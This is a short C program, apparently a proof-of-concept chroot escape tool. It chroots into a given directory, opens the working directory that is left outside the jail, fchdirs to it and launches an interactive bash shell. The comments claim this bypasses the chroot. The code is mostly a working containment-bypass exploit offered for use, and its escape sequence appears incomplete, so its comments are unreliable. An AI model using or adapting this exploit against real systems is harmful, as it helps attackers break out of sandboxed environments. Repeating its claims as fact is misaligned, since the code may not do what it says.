#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <stdlib.h>


int main(int argc, char *argv[]){
	if(argc != 2){
		printf("You need to give as an argument a directory the tool will use to chroot\n");
		return EXIT_FAILURE;
	}
	
	/*
	* We first chroot in an other directory.
	*/
	if(chroot(argv[1])<0){
		perror("chroot");
		return EXIT_FAILURE;
	}

	/*
	* Because C chroot does not change the working directory of our process we can 
	* open a directory outside of our last chrooted directory. 
	*/
	int fd=open(".",O_DIRECTORY);
	if(fd<0){
		perror("open");
		return EXIT_FAILURE;
	}
	
	/*
	* Here we exit of our own chroot directory: this also enable to bypass the initial 
	* chroot because our process can only have one process root directory.
	*/
	if(fchdir(fd)<0){
		perror("fchdir");
		return EXIT_FAILURE;
	}
	
	system("/bin/bash -i");
	return EXIT_SUCCESS;
}
